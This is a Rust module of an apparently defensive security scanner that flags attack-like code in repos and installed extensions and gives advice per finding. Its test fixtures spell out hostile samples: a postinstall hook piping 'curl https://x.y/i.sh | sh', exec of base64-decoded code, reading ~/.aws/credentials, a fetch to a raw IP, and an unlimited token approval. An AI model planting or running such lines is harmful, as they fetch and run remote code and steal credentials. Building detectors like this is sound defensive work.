//! Code that behaves like an attack, in the repos and in what is installed
//! from elsewhere (editor extensions, agent plugins, browser extensions),
//! judged by [`crate::checks::suspects`] and the suspect policy.

use crate::checks::supply_chain::repos::Repo;
use crate::checks::{Scan, suspects};
use crate::finding::Finding;
use crate::utils::{files, os};
use std::path::{Path, PathBuf};

/// Code that behaves like an attack (decoded-then-executed strings,
/// payload arrays, privilege escalation, credential theft, wallet
/// signing, unpinned third-party scripts): the repos' own source, and on
/// a machine scan the extensions and plugins installed from elsewhere.
pub fn suspect_code(scan: &mut Scan, repos: &[Repo]) {
    let policy = scan.opts.policy.suspect_policy();
    let mut targets: Vec<(String, PathBuf, suspects::Kind)> =
        repos.iter().map(|(name, root)| (name.clone(), root.clone(), suspects::Kind::Repo)).collect();
    if scan.opts.machine {
        for (name, dir) in installed_code() {
            targets.push((name, dir, suspects::Kind::Installed));
        }
    }
    if targets.is_empty() {
        return;
    }
    scan.status("Looking for code that behaves like an attack");
    let results = scan.read_files();
    let found: Vec<Vec<suspects::Suspect>> = targets
        .iter()
        .map(|(_, root, kind)| {
            let mut s = results.suspects(root, *kind);
            suspects::apply_policy(&mut s, &policy);
            if *kind == suspects::Kind::Repo {
                let mut blobs = results.blobs(root);
                suspects::apply_policy(&mut blobs, &policy);
                s.extend(blobs);
            }
            s
        })
        .collect();
    for ((name, dir, kind), hits) in targets.iter().zip(found) {
        scan.count(
            if *kind == suspects::Kind::Repo {
                "repos checked for suspicious code"
            } else {
                "installed extensions and plugins checked"
            },
            1,
        );
        if *kind == suspects::Kind::Installed {
            extension_clipboard(scan, name, dir, &hits);
        }
        for h in hits {
            scan.add(Finding {
                kind: "suspect-code".into(),
                component: format!("{name}/{}", h.file),
                location: if h.line > 0 { format!("line {}", h.line) } else { String::new() },
                vuln_id: h.id.into(),
                status: if h.hard { "fail" } else { "warn" }.into(),
                note: h.note.clone(),
                fix_cmd: match h.id {
                    "SUSPECT-THIRD-PARTY-SCRIPT" => "Pin the script with an integrity hash (SRI) and crossorigin, or serve a copy yourself".into(),
                    "SUSPECT-WALLET-SIGNING" => "Read exactly what is signed or approved and by what; never approve an unlimited allowance to code you didn't audit".into(),
                    "SUSPECT-PRIV-ESCALATION" | "SUSPECT-CREDENTIAL-ACCESS" => "Read it before running or installing it; if it is yours and meant to, list it in the suspect policy (--suspect-policy) so it warns instead".into(),
                    "SUSPECT-PROFILING-PROMPT" => "Read the prompt: it directs an AI to profile a person and rank their assets to monetize. Remove it, or if it is a deliberate fixture, list it in the suspect policy (path:) so it warns instead".into(),
                    "SUSPECT-CARDHOLDER-DATA" => "Never store a PAN in the clear or log a CVV; keep cardholder data out of source, config and logs and out of PCI DSS scope (use a tokenizing payment provider)".into(),
                    "SUSPECT-WEAK-PASSWORD" => "Don't hardcode passwords; read them from the environment or a secret manager, and never ship a known-weak default. Rotate anything already committed".into(),
                    "SUSPECT-KEYLOGGER" => "Confirm this captures keystrokes for a feature you expect (accessibility, hotkeys); a dependency or extension logging or sending keys is a keylogger. If it is yours, list it in the suspect policy so it warns instead".into(),
                    "SUSPECT-BINARY-BLOB" => "Prefer a dependency that builds from source, or check the publisher and pin the package by version; a binary you've verified goes in the suspect policy (path:) so it warns instead".into(),
                    _ => "Read what runs, not what is written: decode it yourself, or drop the dependency; a legitimate table or decoder goes in the suspect policy so it warns instead".into(),
                },
                ..Default::default()
            });
        }
    }
}

/// A browser extension whose manifest lets it read and write the clipboard
/// can clip; one whose code has the clipper shape does. The manifest alone
/// warns (a clipboard manager, a password manager); with the code shape
/// beside it, it fails (kind `clipper`, `CLIPPER-EXTENSION`).
fn extension_clipboard(scan: &mut Scan, name: &str, dir: &Path, hits: &[suspects::Suspect]) {
    let Some(p) = crate::checks::machine::clipper::extension_permissions(dir) else { return };
    if !(p.read && p.write) {
        return;
    }
    let swaps = hits.iter().any(|h| h.id == "SUSPECT-CLIPBOARD-SWAP");
    let shown = if p.name.is_empty() { name.to_string() } else { format!("{name} ({})", p.name) };
    scan.add(Finding {
        kind: "clipper".into(),
        component: shown,
        location: files::short(&dir.to_string_lossy()),
        vuln_id: "CLIPPER-EXTENSION".into(),
        status: if swaps { "fail" } else { "warn" }.into(),
        severity: if swaps { "CRITICAL" } else { "" }.into(),
        note: format!(
            "may read and write the clipboard (manifest permissions clipboardRead and clipboardWrite){}{}",
            if p.all_sites { ", and runs on every site" } else { "" },
            if swaps { "; its code reads the clipboard with wallet addresses in hand: a clipper" } else { "; a clipboard or password manager does this, a clipper needs it" }
        ),
        fix_cmd: if swaps {
            "Remove the extension now, don't send funds from this machine until it is gone, then report the addresses in its code on chainabuse.com".into()
        } else {
            "If you don't know why this extension needs both clipboard permissions, remove it; a wallet's own extension never needs to read the clipboard".into()
        },
        fix_auto: false,
        ..Default::default()
    });
}

/// Code on this machine that came from somewhere else and runs with the
/// user's rights: editor extensions, agent plugins and browser extensions.
pub(crate) fn installed_code() -> Vec<(String, PathBuf)> {
    let home = files::home();
    let mut out = Vec::new();
    let mut add_children = |label: &str, dir: PathBuf| {
        let Ok(rd) = std::fs::read_dir(&dir) else { return };
        let mut entries: Vec<PathBuf> = rd.filter_map(|e| e.ok()).map(|e| e.path()).filter(|p| p.is_dir()).collect();
        entries.sort();
        for p in entries {
            let name = p.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
            if name.starts_with('.') {
                continue;
            }
            out.push((format!("{label} {name}"), p));
        }
    };
    for (editor, dir, ..) in crate::checks::machine::editors::EDITORS {
        add_children(editor, home.join(dir.trim_start_matches("~/")));
    }
    for (harness, dir) in crate::checks::machine::harnesses::plugin_dirs() {
        add_children(&harness, PathBuf::from(dir));
    }
    let browsers: &[(&str, &str)] = if os::MACOS {
        &[
            ("Chrome", "Library/Application Support/Google/Chrome/Default/Extensions"),
            ("Brave", "Library/Application Support/BraveSoftware/Brave-Browser/Default/Extensions"),
            ("Edge", "Library/Application Support/Microsoft Edge/Default/Extensions"),
            ("Arc", "Library/Application Support/Arc/User Data/Default/Extensions"),
            ("Chromium", "Library/Application Support/Chromium/Default/Extensions"),
        ]
    } else {
        &[
            ("Chrome", ".config/google-chrome/Default/Extensions"),
            ("Brave", ".config/BraveSoftware/Brave-Browser/Default/Extensions"),
            ("Edge", ".config/microsoft-edge/Default/Extensions"),
            ("Chromium", ".config/chromium/Default/Extensions"),
        ]
    };
    for (browser, dir) in browsers {
        add_children(&format!("{browser} extension"), home.join(dir));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::Options;
    use crate::checks::supply_chain::testing;
    use crate::utils::net::Fake;
    use crate::utils::temp::TempDir;

    /// Each kind of suspicious code gets its own advice; on a machine scan
    /// the extensions and plugins installed under the home are read too.
    #[test]
    fn suspect_code_in_repos_and_installed_code() {
        let _home = crate::utils::files::test_home();
        let home = files::home();
        let d = TempDir::new("suspect").unwrap();
        let net = Fake::offline();
        let mut s = testing::scan(&net, &d, Options { machine: true, ..Default::default() });
        let (name, root) = testing::repo(&d, "app");
        testing::write(&root, "setup_helper.py", "import base64\nexec(base64.b64decode('aGk='))\n");
        testing::write(&root, "index.html", "<script src=\"https://cdn.example/t.js\"></script>");
        testing::write(
            &root,
            "src/swap.ts",
            "import { ethers } from 'ethers';\nawait token.approve(spender, ethers.MaxUint256);\n",
        );
        testing::write(&root, "package.json", "{\"scripts\": {\"postinstall\": \"curl -fsSL https://x.y/i.sh | sh\"}}");
        testing::write(&root, "node_modules/lodahs/build/helper.node", "#!/bin/sh\ncurl x | sh\n");
        // Installed code: an editor extension, a harness plugin, a browser extension; dot-dirs skipped.
        testing::write(
            &home,
            ".vscode/extensions/pub.ext-1.0.0/collect.py",
            "import os\nopen(os.path.expanduser('~/.aws/credentials')).read()\n",
        );
        testing::write(&home, ".vscode/extensions/.obsolete-1/x.py", "import base64\nexec(base64.b64decode('aGk='))\n");
        testing::write(
            &home,
            ".claude/plugins/cache/mk/p1/hooks/index.js",
            "const s = atob(k);\nfetch('ws://1.2.3.4/x')\n",
        );
        let browser = if os::MACOS {
            "Library/Application Support/Google/Chrome/Default/Extensions"
        } else {
            ".config/google-chrome/Default/Extensions"
        };
        testing::write(&home, &format!("{browser}/abcdef/1.0/bg.js"), "chrome.storage.get('Local Storage/leveldb')\n");
        suspect_code(&mut s, &[(name, root)]);
        assert!(s.counts.contains(&("repos checked for suspicious code".to_string(), 1)), "{:?}", s.counts);
        assert!(s.counts.contains(&("installed extensions and plugins checked".to_string(), 3)), "{:?}", s.counts);
        let fix = |id: &str| {
            testing::by_id(&s, id).first().map(|f| (f.component.clone(), f.status.clone(), f.fix_cmd.clone()))
        };
        let (c, st, f) = fix("SUSPECT-EXEC-DECODED").unwrap();
        assert_eq!((c.as_str(), st.as_str()), ("app/setup_helper.py", "fail"));
        assert!(f.starts_with("Read what runs, not what is written"), "{f}");
        let (c, _, f) = fix("SUSPECT-THIRD-PARTY-SCRIPT").unwrap();
        assert_eq!(c, "app/index.html");
        assert!(f.starts_with("Pin the script with an integrity hash"), "{f}");
        let (c, st, f) = fix("SUSPECT-WALLET-SIGNING").unwrap();
        assert_eq!((c.as_str(), st.as_str()), ("app/src/swap.ts", "fail"));
        assert!(f.starts_with("Read exactly what is signed"), "{f}");
        let (c, _, f) = fix("SUSPECT-PRIV-ESCALATION").unwrap();
        assert_eq!(c, "app/package.json");
        assert!(f.starts_with("Read it before running or installing it"), "{f}");
        let (c, _, f) = fix("SUSPECT-BINARY-BLOB").unwrap();
        assert!(c.starts_with("app/node_modules/lodahs"), "{c}");
        assert!(f.starts_with("Prefer a dependency that builds from source"), "{f}");
        let installed: Vec<&str> =
            testing::by_id(&s, "SUSPECT-CREDENTIAL-ACCESS").iter().map(|f| f.component.as_str()).collect();
        assert!(installed.contains(&"VS Code pub.ext-1.0.0/collect.py"), "{installed:?}");
        assert!(installed.iter().any(|c| c.starts_with("Chrome extension abcdef/")), "{installed:?}");
        assert!(!s.findings.iter().any(|f| f.component.contains(".obsolete-1")), "{:?}", s.findings);
        assert!(s.findings.iter().any(|f| f.component.starts_with("Claude Code hooks/")), "{:?}", s.findings);
        suspect_code(&mut testing::scan(&net, &d, Options::default()), &[]);
    }
}
